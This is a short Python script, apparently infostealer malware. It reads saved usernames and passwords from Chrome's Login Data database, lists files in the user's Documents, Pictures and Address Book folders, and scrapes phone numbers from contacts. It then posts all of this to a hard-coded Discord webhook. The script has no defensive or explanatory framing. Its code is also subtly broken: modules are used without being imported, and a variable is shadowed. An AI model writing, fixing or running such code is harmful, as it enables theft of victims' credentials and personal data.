import os
import subprocess
import base64
import json
import requests

def send_to_discord(webhook_url, message):
    data = {'content': message}
    response = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
    return response.status_code

def get_credentials():
    chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
    db = sqlite3.connect(chrome_path)
    cursor = db.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    credentials = cursor.fetchall()
    db.close()
    return credentials

def get_files():
    documents_path = os.path.join(os.environ['USERPROFILE'], 'Documents')
    pictures_path = os.path.join(os.environ['USERPROFILE'], 'Pictures')
    contacts_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Address Book')
    file_paths = [documents_path, pictures_path, contacts_path]
    files = []
    for path in file_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                for file in files:
                    files.append(os.path.join(root, file))
    return files

def get_phone_numbers():
    contacts_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Roaming', 'Microsoft', 'Address Book')
    phone_numbers = []
    if os.path.exists(contacts_path):
        for root, dirs, files in os.walk(contacts_path):
            for file in files:
                with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    phone_numbers.extend(re.findall(r'\+?\d[\d -]{8,12}\d', content))
    return phone_numbers

def main():
    webhook_url = 'https://discord.com/api/webhooks/1391371129146572903/bXrh3RqEi2cJtd2FyOpiUEBL-5BF-gcNRpT024mmKI-nml3AaxjZSO1utodKTCCbHi9a'

    credentials = get_credentials()
    credentials_message = "\n".join([f"Origin URL: {origin}\nUsername: {username}\nPassword: {password}\n\n" for origin, username, password in credentials])

    files = get_files()
    files_message = "\n".join([f"File Path: {file}\n" for file in files])

    phone_numbers = get_phone_numbers()
    phone_numbers_message = "\n".join(phone_numbers)

    final_message = f"Credentials:\n{credentials_message}\nFiles:\n{files_message}\nPhone Numbers:\n{phone_numbers_message}"
    send_to_discord(webhook_url, final_message)

if __name__ == "__main__":
    main()